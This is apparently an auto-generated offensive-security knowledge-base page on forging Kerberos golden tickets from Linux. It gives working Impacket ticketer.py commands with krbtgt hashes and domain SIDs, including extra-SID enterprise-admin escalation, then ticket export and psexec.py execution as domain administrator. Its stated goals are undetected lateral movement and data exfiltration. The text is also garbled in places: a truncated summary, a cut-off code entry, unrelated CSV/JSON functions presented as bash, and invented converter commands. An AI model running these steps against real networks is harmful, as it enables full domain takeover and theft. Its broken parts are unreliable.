---
id: 34e5c3e4-e093-4dcb-87b9-a447cd759896
name: Golden Ticket Kerberos Attack on Linux
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.808331+00:00'
updated_at: '2023-04-10T20:26:04.537794+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Kerberoasting|T1208 - Kerberoasting]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Tickets]]'
- '[[Pass-the-Ticket Golden Tickets]]'
- '[[Using a ticket on Linux]]'
commands:
- '[[Alternatively, use ticketer from Impacket]]'
- '[[Convert ccache to kirbi using ticket_converter.py]]'
- '[[Convert CSV to JSON]]'
- '[[Convert kirbi to ccache using ticket_converter.py]]'
- '[[Convert ticket kirbi to ccache with kekeo]]'
- '[[Display the contents of the KRB5CCNAME file]]'
- '[[Execute psexec.py with the ticket]]'
- '[[Read CSV file]]'
- '[[Set KRB5CCNAME environment variable]]'
- '[[Write JSON to file]]'
---

# Golden Ticket Kerberos Attack on Linux

## Summary

The Golden Ticket Kerberos Attack on Linux is a technique used by attackers to gain access to a network by creating a forged Kerberos ticket granting them full domain admin privileges. Attackers can use the Ticket Conversion and Kekeo Tool commands to convert a Kirbi ticket to Ccache and then use T

## Description

# Description

The Golden Ticket Kerberos Attack on Linux is a technique used by attackers to gain access to a network by creating a forged Kerberos ticket granting them full domain admin privileges. Attackers can use the Ticket Conversion and Kekeo Tool commands to convert a Kirbi ticket to Ccache and then use Ticketer and Psexec to create the Golden Ticket. This attack can be devastating for organizations as it allows attackers to move laterally throughout the network undetected and exfiltrate sensitive data.

From a technical perspective, this attack works by taking advantage of the way Kerberos tickets are issued and validated. Kerberos is a network authentication protocol that uses tickets to authenticate users and grant access to resources. By creating a forged ticket, attackers can bypass the authentication process and gain access to sensitive resources.

The business value of this attack is that it allows attackers to gain full access to a network and steal sensitive data, compromising the integrity and confidentiality of an organization's information.

 

## Requirements

1. Valid domain credentials

1. Access to a Linux machine

1. Ticketer and Psexec installed on the Linux machine

1. Kirbi ticket

 

## Defense

1. Implement multi-factor authentication to prevent attackers from obtaining valid domain credentials

1. Monitor for abnormal login activity and ticket requests

1. Implement network segmentation to limit lateral movement

 

## Objectives

1. Create a Golden Ticket to gain full domain admin privileges

1. Move laterally throughout the network undetected

1. Exfiltrate sensitive data

 

# Instructions

1. This command is used to convert a kirbi ticket to ccache using kekeo or ticketer from Impacket. Once the conversion is done, the ccache ticket is exported to a file and the contents of the file are displayed using the 'cat' command. Finally, psexec is used to execute commands on a remote machine with the help of the ccache ticket.

 



**Code**: [[# Convert the ticket kirbi to ccache with kekeo
mi]]



> The command starts by converting a kirbi ticket to ccache using either kekeo or ticketer from Impacket. The converted ccache ticket is then exported to a file and the contents of the file are displayed using the 'cat' command. Finally, psexec is used to execute commands on a remote machine with the help of the ccache ticket. The '-k' flag is used to indicate that the ccache ticket should be used for authentication, while the '-no-pass' flag indicates that no password should be used. The '-dc-ip' flag is used to specify the IP address of the domain controller, while 'AD/administrator@192.168.1.100' specifies the user account to use for authentication.



**Command** ([[Convert ticket kirbi to ccache with kekeo]]):

```bash
misc::convert ccache ticket.kirbi
```





**Command** ([[Alternatively, use ticketer from Impacket]]):

```bash
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
```





**Command** ([[Set KRB5CCNAME environment variable]]):

```bash
export KRB5CCNAME=/home/user/ticket.ccache
```





**Command** ([[Display the contents of the KRB5CCNAME file]]):

```bash
cat $KRB5CCNAME
```





**Command** ([[Execute psexec.py with the ticket]]):

```bash
./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100
```



2. To convert a ticket from Windows to Linux, use the command 'win_to_lin_ticket_converter'. To convert a ticket from Linux to Windows, use the command 'lin_to_win_ticket_converter'.

 



**Code**: [[ticket_converter]]



> The 'win_to_lin_ticket_converter' command takes one argument, which is the path to the Windows ticket file. The converted Linux ticket will be saved in the same directory with the same name, but with the '.krb5' extension. The 'lin_to_win_ticket_converter' command takes one argument, which is the path to the Linux ticket file. The converted Windows ticket will be saved in the same directory with the same name, but with the '.kirbi' extension.



**Command** ([[Read CSV file]]):

```bash
read_csv('tickets.csv')
```





**Command** ([[Convert CSV to JSON]]):

```bash
convert_to_json()
```





**Command** ([[Write JSON to file]]):

```bash
write_json('tickets.json')
```



3. The Kekeo tool is a powerful toolkit for interacting with Microsoft Kerberos authentication. It allows you to perform various actions such as dumping Kerberos tickets, brute-forcing Kerberos passwords, and more.

 



**Code**: [[kekeo]]



> The 'kekeo' command is used to launch the Kekeo tool and access its various functionalities. The tool can be used to perform actions such as dumping Kerberos tickets, brute-forcing Kerberos passwords, and more. The command can be further customized using various arguments such as '-ticket' to specify the path to a Kerberos ticket, '-target' to specify the target domain or computer, '-rc4' to use RC4 encryption, and more. For more information on the available arguments and their usage, please refer to the Kekeo documentation.

4. To convert a CCache file to a Kerberos ticket file, run the following command:

python ticket_converter.py <ccache_file> <kirbi_file>

To convert a Kerberos ticket file to a CCache file, run the following command:

python ticket_converter.py <kirbi_file> <ccache_file>

 



**Code**: [[root@kali:ticket_converter$ python ticket_converte]]



> The 'ticket_converter.py' script is used to convert between CCache and Kerberos ticket files. The first argument is the path to the input file, and the second argument is the path to the output file. When converting from CCache to Kerberos ticket format, the output file will have a '.kirbi' extension. When converting from Kerberos ticket format to CCache, the output file will have a '.ccache' extension.



**Command** ([[Convert ccache to kirbi using ticket_converter.py]]):

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
```





**Command** ([[Convert kirbi to ccache using ticket_converter.py]]):

```bash
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Kerberoasting|T1208 - Kerberoasting]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[Alternatively, use ticketer from Impacket]]
- [[Convert ccache to kirbi using ticket_converter.py]]
- [[Convert CSV to JSON]]
- [[Convert kirbi to ccache using ticket_converter.py]]
- [[Convert ticket kirbi to ccache with kekeo]]
- [[Display the contents of the KRB5CCNAME file]]
- [[Execute psexec.py with the ticket]]
- [[Read CSV file]]
- [[Set KRB5CCNAME environment variable]]
- [[Write JSON to file]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Tickets]]
- [[Pass-the-Ticket Golden Tickets]]
- [[Using a ticket on Linux]]


